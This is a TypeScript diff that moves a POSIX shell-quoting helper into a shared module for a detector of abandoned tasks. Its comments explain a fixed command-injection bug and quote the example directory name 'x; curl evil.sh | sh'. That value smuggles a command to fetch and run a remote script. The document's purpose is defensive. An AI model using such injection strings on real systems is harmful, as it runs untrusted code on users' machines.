@@ -14,26 +14,14 @@ import type { RecommendationInput } from '../types';
 import { short } from '../shared';
 import type { TaskRecord } from '../../parse-tasks';
 import { COLD_DAYS } from '../../parse-tasks';
+// `sessionId` is a directory entry name read from `~/.claude/tasks/` — the
+// parser does not constrain it to UUID characters — so interpolating it raw
+// into a command let a directory called `x; curl evil.sh | sh` run whatever it
+// liked the moment the user copied the "fix" (#3230). Always-quote so the
+// `find` path stays one inert argument (#3379).
+import { shellQuote } from '../../shell-quote';
 
 const MS_PER_DAY = 24 * 60 * 60 * 1000;
-
-/**
- * POSIX single-quote a value so it survives a copy-pasted shell command as ONE
- * inert literal argument.
- *
- * `sessionId` is a directory entry name read from `~/.claude/tasks/` — the
- * parser does not constrain it to UUID characters — so interpolating it raw
- * into a command let a directory called `x; curl evil.sh | sh` run whatever it
- * liked the moment the user copied the "fix" (#3230). Inside single quotes the
- * shell expands nothing: `;`, `|`, `&`, backticks, `$(…)`, `*`, and newlines are
- * all literal. The one character single quotes cannot contain is `'` itself,
- * so each is closed, escaped, and reopened — the standard `'\''` idiom used
- * elsewhere in this repo (`repeated-command-snippet.ts`,
- * `config-hygiene-actions.ts`).
- */
-export function shellQuote(value: string): string {
-  return `'${value.replace(/'/g, `'\\''`)}'`;
-}
 
 export const detector: Detector = {
   id: 'workflow.abandoned-tasks',
